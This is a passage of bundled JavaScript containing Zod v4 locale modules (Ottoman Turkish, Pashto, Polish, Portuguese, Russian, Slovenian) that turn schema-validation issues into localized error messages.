    ipv6: "IPv6 ni\u015F\xE2n\u0131",
    cidrv4: "IPv4 menzili",
    cidrv6: "IPv6 menzili",
    base64: "base64-\u015Fifreli metin",
    base64url: "base64url-\u015Fifreli metin",
    json_string: "JSON metin",
    e164: "E.164 say\u0131s\u0131",
    jwt: "JWT",
    template_literal: "giren"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "numara",
    array: "saf",
    null: "gayb"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `F\xE2sit giren: umulan instanceof ${issue2.expected}, al\u0131nan ${received}`;
        }
        return `F\xE2sit giren: umulan ${expected}, al\u0131nan ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `F\xE2sit giren: umulan ${stringifyPrimitive(issue2.values[0])}`;
        return `F\xE2sit tercih: m\xFBteberler ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Fazla b\xFCy\xFCk: ${issue2.origin ?? "value"}, ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "elements"} sahip olmal\u0131yd\u0131.`;
        return `Fazla b\xFCy\xFCk: ${issue2.origin ?? "value"}, ${adj}${issue2.maximum.toString()} olmal\u0131yd\u0131.`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Fazla k\xFC\xE7\xFCk: ${issue2.origin}, ${adj}${issue2.minimum.toString()} ${sizing.unit} sahip olmal\u0131yd\u0131.`;
        }
        return `Fazla k\xFC\xE7\xFCk: ${issue2.origin}, ${adj}${issue2.minimum.toString()} olmal\u0131yd\u0131.`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `F\xE2sit metin: "${_issue.prefix}" ile ba\u015Flamal\u0131.`;
        if (_issue.format === "ends_with")
          return `F\xE2sit metin: "${_issue.suffix}" ile bitmeli.`;
        if (_issue.format === "includes")
          return `F\xE2sit metin: "${_issue.includes}" ihtiv\xE2 etmeli.`;
        if (_issue.format === "regex")
          return `F\xE2sit metin: ${_issue.pattern} nak\u015F\u0131na uymal\u0131.`;
        return `F\xE2sit ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `F\xE2sit say\u0131: ${issue2.divisor} kat\u0131 olmal\u0131yd\u0131.`;
      case "unrecognized_keys":
        return `Tan\u0131nmayan anahtar ${issue2.keys.length > 1 ? "s" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `${issue2.origin} i\xE7in tan\u0131nmayan anahtar var.`;
      case "invalid_union":
        return "Giren tan\u0131namad\u0131.";
      case "invalid_element":
        return `${issue2.origin} i\xE7in tan\u0131nmayan k\u0131ymet var.`;
      default:
        return `K\u0131ymet tan\u0131namad\u0131.`;
    }
  };
};
function ota_default() {
  return {
    localeError: error31()
  };
}
// node_modules/zod/v4/locales/ps.js
var error32 = () => {
  const Sizable = {
    string: { unit: "\u062A\u0648\u06A9\u064A", verb: "\u0648\u0644\u0631\u064A" },
    file: { unit: "\u0628\u0627\u06CC\u067C\u0633", verb: "\u0648\u0644\u0631\u064A" },
    array: { unit: "\u062A\u0648\u06A9\u064A", verb: "\u0648\u0644\u0631\u064A" },
    set: { unit: "\u062A\u0648\u06A9\u064A", verb: "\u0648\u0644\u0631\u064A" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u0648\u0631\u0648\u062F\u064A",
    email: "\u0628\u0631\u06CC\u069A\u0646\u0627\u0644\u06CC\u06A9",
    url: "\u06CC\u0648 \u0622\u0631 \u0627\u0644",
    emoji: "\u0627\u06CC\u0645\u0648\u062C\u064A",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u0646\u06CC\u067C\u0647 \u0627\u0648 \u0648\u062E\u062A",
    date: "\u0646\u06D0\u067C\u0647",
    time: "\u0648\u062E\u062A",
    duration: "\u0645\u0648\u062F\u0647",
    ipv4: "\u062F IPv4 \u067E\u062A\u0647",
    ipv6: "\u062F IPv6 \u067E\u062A\u0647",
    cidrv4: "\u062F IPv4 \u0633\u0627\u062D\u0647",
    cidrv6: "\u062F IPv6 \u0633\u0627\u062D\u0647",
    base64: "base64-encoded \u0645\u062A\u0646",
    base64url: "base64url-encoded \u0645\u062A\u0646",
    json_string: "JSON \u0645\u062A\u0646",
    e164: "\u062F E.164 \u0634\u0645\u06D0\u0631\u0647",
    jwt: "JWT",
    template_literal: "\u0648\u0631\u0648\u062F\u064A"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u0639\u062F\u062F",
    array: "\u0627\u0631\u06D0"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u0646\u0627\u0633\u0645 \u0648\u0631\u0648\u062F\u064A: \u0628\u0627\u06CC\u062F instanceof ${issue2.expected} \u0648\u0627\u06CC, \u0645\u06AB\u0631 ${received} \u062A\u0631\u0644\u0627\u0633\u0647 \u0634\u0648`;
        }
        return `\u0646\u0627\u0633\u0645 \u0648\u0631\u0648\u062F\u064A: \u0628\u0627\u06CC\u062F ${expected} \u0648\u0627\u06CC, \u0645\u06AB\u0631 ${received} \u062A\u0631\u0644\u0627\u0633\u0647 \u0634\u0648`;
      }
      case "invalid_value":
        if (issue2.values.length === 1) {
          return `\u0646\u0627\u0633\u0645 \u0648\u0631\u0648\u062F\u064A: \u0628\u0627\u06CC\u062F ${stringifyPrimitive(issue2.values[0])} \u0648\u0627\u06CC`;
        }
        return `\u0646\u0627\u0633\u0645 \u0627\u0646\u062A\u062E\u0627\u0628: \u0628\u0627\u06CC\u062F \u06CC\u0648 \u0644\u0647 ${joinValues(issue2.values, "|")} \u0685\u062E\u0647 \u0648\u0627\u06CC`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u0689\u06CC\u0631 \u0644\u0648\u06CC: ${issue2.origin ?? "\u0627\u0631\u0632\u069A\u062A"} \u0628\u0627\u06CC\u062F ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "\u0639\u0646\u0635\u0631\u0648\u0646\u0647"} \u0648\u0644\u0631\u064A`;
        }
        return `\u0689\u06CC\u0631 \u0644\u0648\u06CC: ${issue2.origin ?? "\u0627\u0631\u0632\u069A\u062A"} \u0628\u0627\u06CC\u062F ${adj}${issue2.maximum.toString()} \u0648\u064A`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u0689\u06CC\u0631 \u06A9\u0648\u0686\u0646\u06CC: ${issue2.origin} \u0628\u0627\u06CC\u062F ${adj}${issue2.minimum.toString()} ${sizing.unit} \u0648\u0644\u0631\u064A`;
        }
        return `\u0689\u06CC\u0631 \u06A9\u0648\u0686\u0646\u06CC: ${issue2.origin} \u0628\u0627\u06CC\u062F ${adj}${issue2.minimum.toString()} \u0648\u064A`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `\u0646\u0627\u0633\u0645 \u0645\u062A\u0646: \u0628\u0627\u06CC\u062F \u062F "${_issue.prefix}" \u0633\u0631\u0647 \u067E\u06CC\u0644 \u0634\u064A`;
        }
        if (_issue.format === "ends_with") {
          return `\u0646\u0627\u0633\u0645 \u0645\u062A\u0646: \u0628\u0627\u06CC\u062F \u062F "${_issue.suffix}" \u0633\u0631\u0647 \u067E\u0627\u06CC \u062A\u0647 \u0648\u0631\u0633\u064A\u0696\u064A`;
        }
        if (_issue.format === "includes") {
          return `\u0646\u0627\u0633\u0645 \u0645\u062A\u0646: \u0628\u0627\u06CC\u062F "${_issue.includes}" \u0648\u0644\u0631\u064A`;
        }
        if (_issue.format === "regex") {
          return `\u0646\u0627\u0633\u0645 \u0645\u062A\u0646: \u0628\u0627\u06CC\u062F \u062F ${_issue.pattern} \u0633\u0631\u0647 \u0645\u0637\u0627\u0628\u0642\u062A \u0648\u0644\u0631\u064A`;
        }
        return `${FormatDictionary[_issue.format] ?? issue2.format} \u0646\u0627\u0633\u0645 \u062F\u06CC`;
      }
      case "not_multiple_of":
        return `\u0646\u0627\u0633\u0645 \u0639\u062F\u062F: \u0628\u0627\u06CC\u062F \u062F ${issue2.divisor} \u0645\u0636\u0631\u0628 \u0648\u064A`;
      case "unrecognized_keys":
        return `\u0646\u0627\u0633\u0645 ${issue2.keys.length > 1 ? "\u06A9\u0644\u06CC\u0689\u0648\u0646\u0647" : "\u06A9\u0644\u06CC\u0689"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `\u0646\u0627\u0633\u0645 \u06A9\u0644\u06CC\u0689 \u067E\u0647 ${issue2.origin} \u06A9\u06D0`;
      case "invalid_union":
        return `\u0646\u0627\u0633\u0645\u0647 \u0648\u0631\u0648\u062F\u064A`;
      case "invalid_element":
        return `\u0646\u0627\u0633\u0645 \u0639\u0646\u0635\u0631 \u067E\u0647 ${issue2.origin} \u06A9\u06D0`;
      default:
        return `\u0646\u0627\u0633\u0645\u0647 \u0648\u0631\u0648\u062F\u064A`;
    }
  };
};
function ps_default() {
  return {
    localeError: error32()
  };
}
// node_modules/zod/v4/locales/pl.js
var error33 = () => {
  const Sizable = {
    string: { unit: "znak\xF3w", verb: "mie\u0107" },
    file: { unit: "bajt\xF3w", verb: "mie\u0107" },
    array: { unit: "element\xF3w", verb: "mie\u0107" },
    set: { unit: "element\xF3w", verb: "mie\u0107" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "wyra\u017Cenie",
    email: "adres email",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "data i godzina w formacie ISO",
    date: "data w formacie ISO",
    time: "godzina w formacie ISO",
    duration: "czas trwania ISO",
    ipv4: "adres IPv4",
    ipv6: "adres IPv6",
    cidrv4: "zakres IPv4",
    cidrv6: "zakres IPv6",
    base64: "ci\u0105g znak\xF3w zakodowany w formacie base64",
    base64url: "ci\u0105g znak\xF3w zakodowany w formacie base64url",
    json_string: "ci\u0105g znak\xF3w w formacie JSON",
    e164: "liczba E.164",
    jwt: "JWT",
    template_literal: "wej\u015Bcie"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "liczba",
    array: "tablica"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Nieprawid\u0142owe dane wej\u015Bciowe: oczekiwano instanceof ${issue2.expected}, otrzymano ${received}`;
        }
        return `Nieprawid\u0142owe dane wej\u015Bciowe: oczekiwano ${expected}, otrzymano ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Nieprawid\u0142owe dane wej\u015Bciowe: oczekiwano ${stringifyPrimitive(issue2.values[0])}`;
        return `Nieprawid\u0142owa opcja: oczekiwano jednej z warto\u015Bci ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Za du\u017Ca warto\u015B\u0107: oczekiwano, \u017Ce ${issue2.origin ?? "warto\u015B\u0107"} b\u0119dzie mie\u0107 ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "element\xF3w"}`;
        }
        return `Zbyt du\u017C(y/a/e): oczekiwano, \u017Ce ${issue2.origin ?? "warto\u015B\u0107"} b\u0119dzie wynosi\u0107 ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Za ma\u0142a warto\u015B\u0107: oczekiwano, \u017Ce ${issue2.origin ?? "warto\u015B\u0107"} b\u0119dzie mie\u0107 ${adj}${issue2.minimum.toString()} ${sizing.unit ?? "element\xF3w"}`;
        }
        return `Zbyt ma\u0142(y/a/e): oczekiwano, \u017Ce ${issue2.origin ?? "warto\u015B\u0107"} b\u0119dzie wynosi\u0107 ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Nieprawid\u0142owy ci\u0105g znak\xF3w: musi zaczyna\u0107 si\u0119 od "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Nieprawid\u0142owy ci\u0105g znak\xF3w: musi ko\u0144czy\u0107 si\u0119 na "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Nieprawid\u0142owy ci\u0105g znak\xF3w: musi zawiera\u0107 "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Nieprawid\u0142owy ci\u0105g znak\xF3w: musi odpowiada\u0107 wzorcowi ${_issue.pattern}`;
        return `Nieprawid\u0142ow(y/a/e) ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Nieprawid\u0142owa liczba: musi by\u0107 wielokrotno\u015Bci\u0105 ${issue2.divisor}`;
      case "unrecognized_keys":
        return `Nierozpoznane klucze${issue2.keys.length > 1 ? "s" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Nieprawid\u0142owy klucz w ${issue2.origin}`;
      case "invalid_union":
        return "Nieprawid\u0142owe dane wej\u015Bciowe";
      case "invalid_element":
        return `Nieprawid\u0142owa warto\u015B\u0107 w ${issue2.origin}`;
      default:
        return `Nieprawid\u0142owe dane wej\u015Bciowe`;
    }
  };
};
function pl_default() {
  return {
    localeError: error33()
  };
}
// node_modules/zod/v4/locales/pt.js
var error34 = () => {
  const Sizable = {
    string: { unit: "caracteres", verb: "ter" },
    file: { unit: "bytes", verb: "ter" },
    array: { unit: "itens", verb: "ter" },
    set: { unit: "itens", verb: "ter" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "padr\xE3o",
    email: "endere\xE7o de e-mail",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "data e hora ISO",
    date: "data ISO",
    time: "hora ISO",
    duration: "dura\xE7\xE3o ISO",
    ipv4: "endere\xE7o IPv4",
    ipv6: "endere\xE7o IPv6",
    cidrv4: "faixa de IPv4",
    cidrv6: "faixa de IPv6",
    base64: "texto codificado em base64",
    base64url: "URL codificada em base64",
    json_string: "texto JSON",
    e164: "n\xFAmero E.164",
    jwt: "JWT",
    template_literal: "entrada"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "n\xFAmero",
    null: "nulo"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Tipo inv\xE1lido: esperado instanceof ${issue2.expected}, recebido ${received}`;
        }
        return `Tipo inv\xE1lido: esperado ${expected}, recebido ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Entrada inv\xE1lida: esperado ${stringifyPrimitive(issue2.values[0])}`;
        return `Op\xE7\xE3o inv\xE1lida: esperada uma das ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Muito grande: esperado que ${issue2.origin ?? "valor"} tivesse ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "elementos"}`;
        return `Muito grande: esperado que ${issue2.origin ?? "valor"} fosse ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Muito pequeno: esperado que ${issue2.origin} tivesse ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `Muito pequeno: esperado que ${issue2.origin} fosse ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Texto inv\xE1lido: deve come\xE7ar com "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Texto inv\xE1lido: deve terminar com "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Texto inv\xE1lido: deve incluir "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Texto inv\xE1lido: deve corresponder ao padr\xE3o ${_issue.pattern}`;
        return `${FormatDictionary[_issue.format] ?? issue2.format} inv\xE1lido`;
      }
      case "not_multiple_of":
        return `N\xFAmero inv\xE1lido: deve ser m\xFAltiplo de ${issue2.divisor}`;
      case "unrecognized_keys":
        return `Chave${issue2.keys.length > 1 ? "s" : ""} desconhecida${issue2.keys.length > 1 ? "s" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Chave inv\xE1lida em ${issue2.origin}`;
      case "invalid_union":
        return "Entrada inv\xE1lida";
      case "invalid_element":
        return `Valor inv\xE1lido em ${issue2.origin}`;
      default:
        return `Campo inv\xE1lido`;
    }
  };
};
function pt_default() {
  return {
    localeError: error34()
  };
}
// node_modules/zod/v4/locales/ru.js
function getRussianPlural(count, one, few, many) {
  const absCount = Math.abs(count);
  const lastDigit = absCount % 10;
  const lastTwoDigits = absCount % 100;
  if (lastTwoDigits >= 11 && lastTwoDigits <= 19) {
    return many;
  }
  if (lastDigit === 1) {
    return one;
  }
  if (lastDigit >= 2 && lastDigit <= 4) {
    return few;
  }
  return many;
}
var error35 = () => {
  const Sizable = {
    string: {
      unit: {
        one: "\u0441\u0438\u043C\u0432\u043E\u043B",
        few: "\u0441\u0438\u043C\u0432\u043E\u043B\u0430",
        many: "\u0441\u0438\u043C\u0432\u043E\u043B\u043E\u0432"
      },
      verb: "\u0438\u043C\u0435\u0442\u044C"
    },
    file: {
      unit: {
        one: "\u0431\u0430\u0439\u0442",
        few: "\u0431\u0430\u0439\u0442\u0430",
        many: "\u0431\u0430\u0439\u0442"
      },
      verb: "\u0438\u043C\u0435\u0442\u044C"
    },
    array: {
      unit: {
        one: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442",
        few: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u0430",
        many: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u043E\u0432"
      },
      verb: "\u0438\u043C\u0435\u0442\u044C"
    },
    set: {
      unit: {
        one: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442",
        few: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u0430",
        many: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u043E\u0432"
      },
      verb: "\u0438\u043C\u0435\u0442\u044C"
    }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u0432\u0432\u043E\u0434",
    email: "email \u0430\u0434\u0440\u0435\u0441",
    url: "URL",
    emoji: "\u044D\u043C\u043E\u0434\u0437\u0438",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \u0434\u0430\u0442\u0430 \u0438 \u0432\u0440\u0435\u043C\u044F",
    date: "ISO \u0434\u0430\u0442\u0430",
    time: "ISO \u0432\u0440\u0435\u043C\u044F",
    duration: "ISO \u0434\u043B\u0438\u0442\u0435\u043B\u044C\u043D\u043E\u0441\u0442\u044C",
    ipv4: "IPv4 \u0430\u0434\u0440\u0435\u0441",
    ipv6: "IPv6 \u0430\u0434\u0440\u0435\u0441",
    cidrv4: "IPv4 \u0434\u0438\u0430\u043F\u0430\u0437\u043E\u043D",
    cidrv6: "IPv6 \u0434\u0438\u0430\u043F\u0430\u0437\u043E\u043D",
    base64: "\u0441\u0442\u0440\u043E\u043A\u0430 \u0432 \u0444\u043E\u0440\u043C\u0430\u0442\u0435 base64",
    base64url: "\u0441\u0442\u0440\u043E\u043A\u0430 \u0432 \u0444\u043E\u0440\u043C\u0430\u0442\u0435 base64url",
    json_string: "JSON \u0441\u0442\u0440\u043E\u043A\u0430",
    e164: "\u043D\u043E\u043C\u0435\u0440 E.164",
    jwt: "JWT",
    template_literal: "\u0432\u0432\u043E\u0434"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u0447\u0438\u0441\u043B\u043E",
    array: "\u043C\u0430\u0441\u0441\u0438\u0432"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0439 \u0432\u0432\u043E\u0434: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C instanceof ${issue2.expected}, \u043F\u043E\u043B\u0443\u0447\u0435\u043D\u043E ${received}`;
        }
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0439 \u0432\u0432\u043E\u0434: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C ${expected}, \u043F\u043E\u043B\u0443\u0447\u0435\u043D\u043E ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0439 \u0432\u0432\u043E\u0434: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C ${stringifyPrimitive(issue2.values[0])}`;
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0439 \u0432\u0430\u0440\u0438\u0430\u043D\u0442: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C \u043E\u0434\u043D\u043E \u0438\u0437 ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          const maxValue = Number(issue2.maximum);
          const unit = getRussianPlural(maxValue, sizing.unit.one, sizing.unit.few, sizing.unit.many);
          return `\u0421\u043B\u0438\u0448\u043A\u043E\u043C \u0431\u043E\u043B\u044C\u0448\u043E\u0435 \u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C, \u0447\u0442\u043E ${issue2.origin ?? "\u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435"} \u0431\u0443\u0434\u0435\u0442 \u0438\u043C\u0435\u0442\u044C ${adj}${issue2.maximum.toString()} ${unit}`;
        }
        return `\u0421\u043B\u0438\u0448\u043A\u043E\u043C \u0431\u043E\u043B\u044C\u0448\u043E\u0435 \u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C, \u0447\u0442\u043E ${issue2.origin ?? "\u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435"} \u0431\u0443\u0434\u0435\u0442 ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          const minValue = Number(issue2.minimum);
          const unit = getRussianPlural(minValue, sizing.unit.one, sizing.unit.few, sizing.unit.many);
          return `\u0421\u043B\u0438\u0448\u043A\u043E\u043C \u043C\u0430\u043B\u0435\u043D\u044C\u043A\u043E\u0435 \u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C, \u0447\u0442\u043E ${issue2.origin} \u0431\u0443\u0434\u0435\u0442 \u0438\u043C\u0435\u0442\u044C ${adj}${issue2.minimum.toString()} ${unit}`;
        }
        return `\u0421\u043B\u0438\u0448\u043A\u043E\u043C \u043C\u0430\u043B\u0435\u043D\u044C\u043A\u043E\u0435 \u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C, \u0447\u0442\u043E ${issue2.origin} \u0431\u0443\u0434\u0435\u0442 ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `\u041D\u0435\u0432\u0435\u0440\u043D\u0430\u044F \u0441\u0442\u0440\u043E\u043A\u0430: \u0434\u043E\u043B\u0436\u043D\u0430 \u043D\u0430\u0447\u0438\u043D\u0430\u0442\u044C\u0441\u044F \u0441 "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `\u041D\u0435\u0432\u0435\u0440\u043D\u0430\u044F \u0441\u0442\u0440\u043E\u043A\u0430: \u0434\u043E\u043B\u0436\u043D\u0430 \u0437\u0430\u043A\u0430\u043D\u0447\u0438\u0432\u0430\u0442\u044C\u0441\u044F \u043D\u0430 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u041D\u0435\u0432\u0435\u0440\u043D\u0430\u044F \u0441\u0442\u0440\u043E\u043A\u0430: \u0434\u043E\u043B\u0436\u043D\u0430 \u0441\u043E\u0434\u0435\u0440\u0436\u0430\u0442\u044C "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u041D\u0435\u0432\u0435\u0440\u043D\u0430\u044F \u0441\u0442\u0440\u043E\u043A\u0430: \u0434\u043E\u043B\u0436\u043D\u0430 \u0441\u043E\u043E\u0442\u0432\u0435\u0442\u0441\u0442\u0432\u043E\u0432\u0430\u0442\u044C \u0448\u0430\u0431\u043B\u043E\u043D\u0443 ${_issue.pattern}`;
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0439 ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u043E\u0435 \u0447\u0438\u0441\u043B\u043E: \u0434\u043E\u043B\u0436\u043D\u043E \u0431\u044B\u0442\u044C \u043A\u0440\u0430\u0442\u043D\u044B\u043C ${issue2.divisor}`;
      case "unrecognized_keys":
        return `\u041D\u0435\u0440\u0430\u0441\u043F\u043E\u0437\u043D\u0430\u043D\u043D${issue2.keys.length > 1 ? "\u044B\u0435" : "\u044B\u0439"} \u043A\u043B\u044E\u0447${issue2.keys.length > 1 ? "\u0438" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0439 \u043A\u043B\u044E\u0447 \u0432 ${issue2.origin}`;
      case "invalid_union":
        return "\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0435 \u0432\u0445\u043E\u0434\u043D\u044B\u0435 \u0434\u0430\u043D\u043D\u044B\u0435";
      case "invalid_element":
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u043E\u0435 \u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435 \u0432 ${issue2.origin}`;
      default:
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0435 \u0432\u0445\u043E\u0434\u043D\u044B\u0435 \u0434\u0430\u043D\u043D\u044B\u0435`;
    }
  };
};
function ru_default() {
  return {
    localeError: error35()
  };
}
// node_modules/zod/v4/locales/sl.js
var error36 = () => {
  const Sizable = {
    string: { unit: "znakov", verb: "imeti" },
    file: { unit: "bajtov", verb: "imeti" },
    array: { unit: "elementov", verb: "imeti" },
    set: { unit: "elementov", verb: "imeti" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "vnos",
    email: "e-po\u0161tni naslov",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO datum in \u010Das",
    date: "ISO datum",
    time: "ISO \u010Das",
    duration: "ISO trajanje",
    ipv4: "IPv4 naslov",
    ipv6: "IPv6 naslov",
    cidrv4: "obseg IPv4",
    cidrv6: "obseg IPv6",
    base64: "base64 kodiran niz",
    base64url: "base64url kodiran niz",
    json_string: "JSON niz",
    e164: "E.164 \u0161tevilka",
    jwt: "JWT",
    template_literal: "vnos"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u0161tevilo",
    array: "tabela"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
